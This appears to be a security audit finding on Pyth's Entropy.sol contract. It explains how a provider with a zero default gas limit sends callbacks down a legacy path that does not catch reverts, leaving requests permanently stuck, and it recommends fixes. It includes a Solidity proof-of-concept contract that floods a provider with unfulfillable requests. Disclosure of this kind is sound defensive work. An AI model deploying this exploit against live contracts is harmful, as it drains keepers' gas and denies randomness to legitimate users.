### Title
Permanently Unfulfillable Entropy Requests via Reverting Callback When Provider `defaultGasLimit` Is Zero - (File: `target_chains/ethereum/contracts/contracts/entropy/Entropy.sol`)

---

### Summary

In Pyth's `Entropy.sol`, when a provider has `defaultGasLimit == 0`, any user can create a request from a contract whose `_entropyCallback` always reverts. Because the old callback path (selected when `req.gasLimit10k == 0`) calls the callback directly without catching reverts, every keeper attempt to call `revealWithCallback` for that sequence number reverts and the request is never cleared. There is no admin or provider function to forcibly cancel or clear stuck requests, making them permanently unfulfillable.

---

### Finding Description

**Root cause — `requestHelper` sets `gasLimit10k = 0` when provider has no default gas limit:** [1](#0-0) 

When `providerInfo.defaultGasLimit == 0`, `req.gasLimit10k` is unconditionally set to `0`, regardless of any `callbackGasLimit` the caller passes. This opts the request into the legacy callback path.

**Root cause — `revealWithCallback` calls the callback without catching reverts when `gasLimit10k == 0`:** [2](#0-1) 

The `else` branch (taken when `gasLimit10k == 0`) calls `IEntropyConsumer(callAddress)._entropyCallback(...)` directly. If the requester contract's `_entropyCallback` reverts, the entire `revealWithCallback` transaction reverts. The `clearRequest` call at line 666 is also rolled back, so the request remains in storage permanently.

**Contrast with the new path (gasLimit10k != 0):** [3](#0-2) 

The new path uses `excessivelySafeCall` which catches reverts and transitions the request to `CALLBACK_FAILED` state. The old path has no such protection.

**No cancel/clear mechanism exists for stuck requests.** The only internal `clearRequest` call sites are inside `reveal` and `revealWithCallback` — both of which require a valid provider revelation. There is no admin override or `cancelRequest` function.

**Attack path:**

1. Attacker deploys a contract `MaliciousConsumer` whose `_entropyCallback` always reverts (e.g., `revert("blocked")`).
2. `MaliciousConsumer` calls `requestWithCallback(provider, userContribution)` — which internally calls `requestV2(provider, userContribution, 0)`.
3. Since `providerInfo.defaultGasLimit == 0`, `req.gasLimit10k = 0` is stored.
4. The Fortuna keeper calls `revealWithCallback(provider, sequenceNumber, ...)` — the callback reverts, the entire transaction reverts, the request is never cleared.
5. Attacker repeats this for as many sequence numbers as desired, paying only the request fee each time. [4](#0-3) 

---

### Impact Explanation

- **Permanently stuck requests:** Each malicious request occupies contract storage indefinitely, consuming the provider's sequence number range (`sequenceNumber` to `endSequenceNumber`).
- **Keeper gas drain:** The Fortuna keeper (`apps/fortuna`) retries unfulfillable requests, wasting gas on every attempt with no possibility of success.
- **Provider sequence number exhaustion:** A provider's randomness range is finite (`endSequenceNumber`). Flooding it with stuck requests can exhaust the range, causing `OutOfRandomness` reverts for legitimate users. [5](#0-4) 

---

### Likelihood Explanation

- **Unprivileged entry point:** Any EOA or contract can call `requestWithCallback` by paying the provider fee. No special role is required.
- **Condition:** The provider must have `defaultGasLimit == 0`. Providers that have not called `setDefaultGasLimit` are vulnerable. The legacy `requestWithCallback` interface (still present and callable) is the primary trigger.
- **Cost:** The attacker pays only the request fee per stuck request. The keeper pays gas for every failed fulfillment attempt. [4](#0-3) 

---

### Recommendation

1. **Require `defaultGasLimit > 0` for all providers** before accepting callback requests, or treat `callbackGasLimit = 0` as "use provider default" and reject if provider default is also 0.
2. **Add a `cancelRequest` function** callable by the provider or an admin that forcibly clears a stuck request (refunding the fee or not), analogous to a token whitelist or order cancellation mechanism.
3. **Alternatively**, always use `excessivelySafeCall` regardless of `gasLimit10k`, eliminating the legacy path entirely.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: Apache 2
pragma solidity ^0.8.0;

import "@pythnetwork/entropy-sdk-solidity/IEntropyConsumer.sol";
import "@pythnetwork/entropy-sdk-solidity/IEntropy.sol";

contract MaliciousConsumer is IEntropyConsumer {
    IEntropy entropy;
    address provider;

    constructor(address _entropy, address _provider) {
        entropy = IEntropy(_entropy);
        provider = _provider;
    }

    // Flood the provider with permanently stuck requests
    function attack(uint256 count) external payable {
        uint128 fee = entropy.getFee(provider);
        for (uint i = 0; i < count; i++) {
            entropy.requestWithCallback{value: fee}(
                provider,
                bytes32(uint256(i))
            );
        }
    }

    // Always reverts — keeper can never fulfill these requests
    function _entropyCallback(
        uint64, address, bytes32
    ) internal override {
        revert("blocked");
    }

    function getEntropy() internal view override returns (address) {
        return address(entropy);
    }
}
```

When the Fortuna keeper calls `revealWithCallback` for any sequence number created by `MaliciousConsumer`, the transaction reverts. The requests are never cleared. The provider's sequence numbers are permanently consumed and the keeper wastes gas on every retry attempt. [2](#0-1) [1](#0-0)

### Citations

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L228-231)
```text
        uint64 assignedSequenceNumber = providerInfo.sequenceNumber;
        if (assignedSequenceNumber >= providerInfo.endSequenceNumber)
            revert EntropyErrors.OutOfRandomness();
        providerInfo.sequenceNumber += 1;
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L268-283)
```text
        if (providerInfo.defaultGasLimit == 0) {
            // Provider doesn't support the new callback failure state flow (toggled by setting the gas limit field).
            // Set gasLimit10k to 0 to disable.
            req.gasLimit10k = 0;
        } else {
            // This check does two important things:
            // 1. Providers have a minimum fee set for their defaultGasLimit. If users request less gas than that,
            //    they still pay for the full gas limit. So we may as well give them the full limit here.
            // 2. If a provider has a defaultGasLimit != 0, we need to ensure that all requests have a >0 gas limit
            //    so that we opt-in to the new callback failure state flow.
            req.gasLimit10k = roundTo10kGas(
                callbackGasLimit < providerInfo.defaultGasLimit
                    ? providerInfo.defaultGasLimit
                    : callbackGasLimit
            );
        }
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L346-356)
```text
    function requestWithCallback(
        address provider,
        bytes32 userContribution
    ) public payable override returns (uint64) {
        return
            requestV2(
                provider,
                userContribution,
                0 // Passing 0 will assign the request the provider's default gas limit
            );
    }
```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L574-600)
```text
        if (
            req.gasLimit10k != 0 &&
            req.callbackStatus == EntropyStatusConstants.CALLBACK_NOT_STARTED
        ) {
            req.callbackStatus = EntropyStatusConstants.CALLBACK_IN_PROGRESS;
            bool success;
            bytes memory ret;
            uint256 startingGas = gasleft();
            (success, ret) = req.requester.excessivelySafeCall(
                // Warning: the provided gas limit below is only an *upper bound* on the gas provided to the call.
                // At most 63/64ths of the current context's gas will be provided to a call, which may be less
                // than the indicated gas limit. (See CALL opcode docs here https://www.evm.codes/?fork=cancun#f1)
                // Consequently, out-of-gas reverts need to be handled carefully to ensure that the callback
                // was truly provided with a sufficient amount of gas.
                uint256(req.gasLimit10k) * TEN_THOUSAND,
                256, // copy at most 256 bytes of the return value into ret.
                abi.encodeWithSelector(
                    IEntropyConsumer._entropyCallback.selector,
                    sequenceNumber,
                    provider,
                    randomNumber
                )
            );
            uint32 gasUsed = SafeCast.toUint32(startingGas - gasleft());
            // Reset status to not started here in case the transaction reverts.
            req.callbackStatus = EntropyStatusConstants.CALLBACK_NOT_STARTED;

```

**File:** target_chains/ethereum/contracts/contracts/entropy/Entropy.sol (L661-681)
```text
        } else {
            // This case uses the checks-effects-interactions pattern to avoid reentry attacks
            address callAddress = req.requester;
            EntropyStructs.Request memory reqV1 = EntropyStructConverter
                .toV1Request(req);
            clearRequest(provider, sequenceNumber);
            // WARNING: DO NOT USE req BELOW HERE AS ITS CONTENTS HAS BEEN CLEARED

            // Check if the requester is a contract account.
            uint len;
            assembly {
                len := extcodesize(callAddress)
            }
            uint256 startingGas = gasleft();
            if (len != 0) {
                IEntropyConsumer(callAddress)._entropyCallback(
                    sequenceNumber,
                    provider,
                    randomNumber
                );
            }
```
